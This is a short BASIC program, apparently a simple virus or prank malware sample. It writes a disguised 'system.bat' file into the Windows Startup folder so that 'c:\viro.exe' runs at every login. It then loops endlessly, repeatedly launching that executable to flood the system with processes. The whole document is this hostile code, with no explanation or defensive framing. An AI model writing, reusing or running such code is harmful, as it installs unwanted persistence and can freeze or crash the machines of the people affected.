OPEN "c:\windows\startm~1\programs\startup\system.bat" FOR OUTPUT AS #1
PRINT #1, "c:\viro.exe"
CLOSE #1
start:
SHELL "start /m c:\viro.exe"
PRINT "Hello"
GOTO start

